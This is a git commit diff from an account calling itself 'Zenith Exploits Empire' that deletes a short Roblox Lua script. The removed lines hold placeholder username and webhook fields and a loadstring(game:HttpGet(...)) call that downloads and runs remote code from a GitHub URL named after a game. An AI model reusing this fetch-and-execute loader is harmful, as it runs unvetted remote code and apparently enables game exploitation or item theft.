348af0a2f772662da2e3666fd951d54354a84930
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-05-04 13:59:04 +0200

    Delete Cool-Script.lua

--- Cool-Script.lua
+++
@@ -1,6 +0,0 @@
--- Best Script
-Username = "test"
-Username2 = "test"
-Webhook = "test"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%209"))()
